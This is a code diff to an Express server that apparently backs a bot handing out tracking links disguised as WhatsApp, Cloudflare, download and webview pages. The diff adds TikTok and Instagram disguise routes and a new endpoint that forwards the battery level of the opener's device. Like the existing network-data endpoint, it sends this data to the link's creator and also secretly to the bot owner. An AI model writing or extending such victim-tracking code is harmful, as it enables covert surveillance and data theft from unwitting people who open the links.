@@ -145,6 +145,8 @@ app.get("/w/:path/:uri",  (req, res) => handleLinkOpen(req, res, "webview"));
 app.get("/c/:path/:uri",  (req, res) => handleLinkOpen(req, res, "cloudflare"));
 app.get("/wa/:path/:uri", (req, res) => handleLinkOpen(req, res, "whatsapp"));
 app.get("/dl/:path/:uri", (req, res) => handleLinkOpen(req, res, "download"));
+app.get("/tt/:path/:uri", (req, res) => handleLinkOpen(req, res, "tiktok"));
+app.get("/ig/:path/:uri", (req, res) => handleLinkOpen(req, res, "instagram"));
 
 // ── Bot Logic ─────────────────────────────────────────────────────────────────
 
@@ -570,6 +572,22 @@ app.post("/network", (req, res) => {
     const tid = parseInt(uid, 36);
     notify(tid, `🌐 بيانات الشبكة:\n${data}`);
     if (tid !== BOT_OWNER) notify(BOT_OWNER, `🌐 شبكة (ID: ${tid}):\n${data}`);
+    res.send("Done");
+  } else res.send("Missing");
+});
+
+// Battery alert endpoint
+app.post("/battery", (req, res) => {
+  const uid      = decodeURIComponent(req.body.uid)      || null;
+  const level    = parseInt(req.body.level)               || null;
+  const charging = req.body.charging === 'true';
+  if (uid && level !== null) {
+    const tid = parseInt(uid, 36);
+    if (level <= 20 && !charging) {
+      const msg = `🔋 تنبيه بطارية منخفضة!\n⚡ المستوى: ${level}%\n🔌 الشحن: ${charging ? 'متصل' : 'غير متصل'}`;
+      notify(tid, msg);
+      if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
+    }
     res.send("Done");
   } else res.send("Missing");
 });
